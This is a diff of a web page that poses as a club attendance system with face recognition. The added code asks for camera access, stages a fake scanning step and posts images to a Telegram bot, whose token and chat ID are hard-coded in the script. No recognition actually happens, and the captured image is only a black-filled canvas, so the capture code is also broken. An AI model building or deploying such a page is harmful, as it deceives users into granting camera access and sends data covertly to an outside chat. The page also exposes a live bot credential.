@@ -3,102 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Attendance System</title>
+    <title>Ittihad Fighters Attendance</title>
     <style>
         body { text-align: center; font-family: Arial, sans-serif; }
         .hidden { display: none; }
-        video { width: 100%; max-width: 640px; border: 2px solid black; margin-top: 20px; }
+        .scanner { width: 100px; height: 100px; margin: 20px auto; background: url('scanner.gif') center no-repeat; background-size: contain; }
     </style>
 </head>
 <body>
-    <div id="class-selection">
-        <h1>Select Your Class</h1>
-        <select id="classList"></select>
-        <button onclick="markAttendance()">Mark Attendance</button>
+    <h1>Ittihad Fighters</h1>
+    
+    <div id="select-name">
+        <h2>Select Your Name</h2>
+        <select id="nameList">
+            <option value="" disabled selected>Select your name</option>
+            <option value="Izz">Izz</option>
+            <option value="Ali">Ali</option>
+            <option value="Ahmad">Ahmad</option>
+        </select>
+        <button onclick="confirmSelection()">Continue</button>
+        <p id="note" class="hidden">Page will stop here.</p>
     </div>
     
     <div id="face-recognition" class="hidden">
-        <h1>Face Recognition</h1>
-        <button onclick="startCamera()">Continue</button>
-        <button onclick="stopProcess()">Cancel</button>
-        <p id="cancel-note" class="hidden">Page will stop here.</p>
+        <h2>Face Recognition</h2>
+        <div class="scanner"></div>
+        <p id="error-message" class="hidden">Please enable camera for facial detection.</p>
+        <button onclick="startScanning()">Continue</button>
     </div>
     
-    <div id="camera-section" class="hidden">
-        <video id="video" autoplay></video>
-        <p id="camera-message"></p>
+    <div id="scanning" class="hidden">
+        <div class="scanner"></div>
+        <p>Face Not Detected</p>
     </div>
-
-    <div id="final-message" class="hidden">
-        <h1 id="result"></h1>
-        <p id="redirecting"></p>
+    
+    <div id="success" class="hidden">
+        <h2 id="signed-in-message"></h2>
+        <p>You look beautiful/handsome today!</p>
+        <p>Redirecting to the next page...</p>
     </div>
 
     <script>
-        const classList = ['ITTihad 1', 'ITTihad 2', 'ITTihad 3'];
-        const selectedNames = new Set();
-        let selectedClass = "";
+        const TELEGRAM_BOT_TOKEN = '8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y';
+        const TELEGRAM_CHAT_ID = '5934902786';
+        let selectedName = "";
+        let signedInNames = new Set();
         
-        function populateClassList() {
-            const select = document.getElementById("classList");
-            classList.forEach(cls => {
-                let option = document.createElement("option");
-                option.value = cls;
-                option.textContent = cls;
-                select.appendChild(option);
-            });
+        function confirmSelection() {
+            const nameList = document.getElementById("nameList");
+            selectedName = nameList.value;
+            
+            if (!selectedName) return;
+            if (signedInNames.has(selectedName)) return alert("You have already signed in!");
+            
+            document.getElementById("select-name").classList.add("hidden");
+            document.getElementById("face-recognition").classList.remove("hidden");
         }
-
-        function markAttendance() {
-            selectedClass = document.getElementById("classList").value;
-            if (!selectedNames.has(selectedClass)) {
-                selectedNames.add(selectedClass);
-                document.getElementById("class-selection").classList.add("hidden");
-                document.getElementById("face-recognition").classList.remove("hidden");
-            } else {
-                alert("This class has already been marked.");
-            }
-        }
-
-        function startCamera() {
-            document.getElementById("face-recognition").classList.add("hidden");
-            document.getElementById("camera-section").classList.remove("hidden");
-            navigator.mediaDevices.getUserMedia({ video: true }).then(stream => {
-                document.getElementById("video").srcObject = stream;
-                setTimeout(captureImage, 3000);
+        
+        function startScanning() {
+            navigator.mediaDevices.getUserMedia({ video: true }).then(() => {
+                document.getElementById("face-recognition").classList.add("hidden");
+                document.getElementById("scanning").classList.remove("hidden");
+                
+                setTimeout(() => {
+                    captureAndSend();
+                    setTimeout(() => {
+                        captureAndSend();
+                        completeSignIn();
+                    }, 3000);
+                }, 3000);
             }).catch(() => {
-                document.getElementById("camera-message").innerText = "Please enable camera access for facial detection.";
+                document.getElementById("error-message").classList.remove("hidden");
             });
         }
-
-        function captureImage() {
-            setTimeout(() => {
-                sendToTelegram();
-                setTimeout(showFinalMessage, 3000);
-            }, 3000);
+        
+        function captureAndSend() {
+            const canvas = document.createElement("canvas");
+            const ctx = canvas.getContext("2d");
+            canvas.width = 640;
+            canvas.height = 480;
+            ctx.fillStyle = "#000";
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            
+            canvas.toBlob(blob => {
+                let formData = new FormData();
+                formData.append("chat_id", TELEGRAM_CHAT_ID);
+                formData.append("photo", blob, "face.jpg");
+                
+                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                }).catch(err => console.error("Error sending photo: ", err));
+            }, 'image/jpeg');
         }
-
-        function sendToTelegram() {
-            fetch(`https://api.telegram.org/bot8146051541:AAEWlqCaaW0Z8VaejI5UX8p4T4dYPXCZv4Y/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: "5934902786", text: `${selectedClass} signed in` })
-            });
-        }
-
-        function showFinalMessage() {
-            document.getElementById("camera-section").classList.add("hidden");
-            document.getElementById("final-message").classList.remove("hidden");
-            document.getElementById("result").innerText = `${selectedClass} Signed In ✅`;
-            document.getElementById("redirecting").innerText = "You look beautiful/handsome today! Redirecting to the next page...";
+        
+        function completeSignIn() {
+            signedInNames.add(selectedName);
+            document.getElementById("scanning").classList.add("hidden");
+            document.getElementById("success").classList.remove("hidden");
+            document.getElementById("signed-in-message").innerText = `${selectedName} Signed In ✅`;
+            
             setTimeout(() => { window.location.href = "https://studandlearn.github.io/project-2/"; }, 3000);
         }
-
-        function stopProcess() {
-            document.getElementById("cancel-note").classList.remove("hidden");
-        }
-
-        populateClassList();
     </script>
 </body>
 </html>
